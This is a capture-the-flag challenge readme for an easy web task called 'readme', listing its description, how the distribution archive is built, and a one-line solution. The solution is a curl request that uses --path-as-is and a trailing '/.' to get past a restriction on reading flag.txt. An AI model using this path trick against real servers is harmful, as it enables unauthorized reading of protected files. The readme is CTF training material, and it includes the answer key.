# readme
**Category:** Web
**Difficulty:** Easy
**Author:** maple3142

## Description

Try to read the `flag.txt` file.

## Distribution

- `readme.tar.gz`  (remove flag from Dockerfile then `tar czf readme.tar.gz src public default.conf docker-compose.yml Dockerfile package.json start.sh yarn.lock`)
- url

## Solution

```bash
curl --path-as-is 'http://localhost:80/flag.txt/.'
```
